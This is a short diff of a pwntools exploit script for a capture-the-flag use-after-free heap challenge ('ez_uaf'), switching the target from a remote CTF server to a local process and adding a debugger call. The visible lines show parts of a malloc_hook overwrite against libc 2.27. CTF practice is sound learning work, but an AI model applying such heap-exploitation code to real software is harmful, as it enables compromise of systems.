@@ -1,8 +1,8 @@
 from pwn import *
 
-#io = process("./ez_uaf")
+io = process("./ez_uaf")
 
-io = remote("node5.anna.nssctf.cn", 27477)
+#io = remote("node5.anna.nssctf.cn", 27477)
 libc = ELF(
     "./libc6-dbg_2.27-3ubuntu1.6_amd64/data/usr/lib/debug/lib/x86_64-linux-gnu/libc-2.27.so"
 )
@@ -78,6 +78,7 @@ edit(1, p64(malloc_hook))
 print("edit(1)")
 
 
+gdb_debug()
 add(0x10, b"2222", b"2222")
 print("add(2)")
 add(0x20, b"3333", b"3333")
